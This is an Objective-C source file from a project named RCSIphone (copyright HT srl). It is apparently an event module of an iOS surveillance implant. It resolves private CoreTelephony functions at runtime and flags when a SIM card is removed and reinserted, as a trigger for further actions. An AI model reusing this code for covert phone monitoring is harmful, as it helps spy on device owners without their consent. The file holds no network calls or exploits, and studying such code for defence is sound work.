//
//  RCSIEventSimChange.m
//  RCSIphone
//
//  Created by kiodo on 13/03/12.
//  Copyright 2012 HT srl. All rights reserved.
//
#import <dlfcn.h>
#import "RCSIEventSimChange.h"

typedef char* (*CTSIMSupportCopyMobileSubscriberIdentity_t)();
typedef NSString* (*CTSIMSupportGetSIMStatus_t)();
NSString* kCTSIMSupportSIMStatusReady = @"kCTSIMSupportSIMStatusReady";
NSString* kCTSIMSupportSIMStatusNotInserted = @"kCTSIMSupportSIMStatusNotInserted";

CTSIMSupportCopyMobileSubscriberIdentity_t __CTSIMSupportCopyMobileSubscriberIdentity;
CTSIMSupportGetSIMStatus_t __CTSIMSupportGetSIMStatus;

#define SIM_STATUS_UNDEF   2
#define SIM_STATUS_PRESENT 0
#define SIM_STATUS_EJECTED 1
#define SIM_STATUS_UNSUPPORTED 3

@implementation RCSIEventSimChange

@synthesize simStatus;

+ (BOOL)resolveSimChangeSyms
{
  void* base = dlopen(CT_FRAMEWORK_PUBLIC, RTLD_NOW);
  
  if (base == NULL)
    base = dlopen(CT_FRAMEWORK_PRIVATE, RTLD_NOW);
  
  if (base == NULL)
    return FALSE;
  
  __CTSIMSupportGetSIMStatus = 
  (CTSIMSupportGetSIMStatus_t) dlsym(base, "CTSIMSupportGetSIMStatus");
  
  __CTSIMSupportCopyMobileSubscriberIdentity = 
  (CTSIMSupportCopyMobileSubscriberIdentity_t) dlsym(base, "CTSIMSupportCopyMobileSubscriberIdentity");
  
  if (__CTSIMSupportGetSIMStatus == NULL ||
      __CTSIMSupportCopyMobileSubscriberIdentity == NULL)
    return FALSE;
  
  return TRUE;
}

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      if ([RCSIEventSimChange resolveSimChangeSyms] == FALSE)
        simStatus = SIM_STATUS_UNSUPPORTED;
      else
        simStatus = SIM_STATUS_UNDEF;
    }
  return  self;
}

- (BOOL)simChangeMonitor
{
  BOOL simChanged = FALSE;
  
  if (simStatus == SIM_STATUS_UNSUPPORTED)
    return FALSE;
    
  NSString *sim = __CTSIMSupportGetSIMStatus();
  
  if (sim != nil && [sim compare: kCTSIMSupportSIMStatusReady] == NSOrderedSame)
    {
      if (simStatus == SIM_STATUS_EJECTED)
        {
          simChanged = TRUE;
          simStatus = SIM_STATUS_PRESENT;
        }
      else if (simStatus == SIM_STATUS_PRESENT)
        {
          simChanged = FALSE;
        }
      else if (simStatus == SIM_STATUS_UNDEF)
        {
          simStatus = SIM_STATUS_PRESENT;
          simChanged = FALSE;
        }
    }
  else if (sim != nil && [sim compare: kCTSIMSupportSIMStatusNotInserted] == NSOrderedSame)
    {
      if (simStatus == SIM_STATUS_PRESENT)
        {
          simStatus = SIM_STATUS_EJECTED;
          simChanged = FALSE;
        }
      else if (simStatus == SIM_STATUS_UNDEF)
        {
          simStatus = SIM_STATUS_EJECTED;
          simChanged = FALSE;
        }
      else if (simStatus == SIM_STATUS_EJECTED)
        {
          simStatus = SIM_STATUS_EJECTED;
          simChanged = FALSE;
        }
    }
    
  return simChanged;
}

- (BOOL)readyToTriggerStart
{
  return [self simChangeMonitor];
}

@end
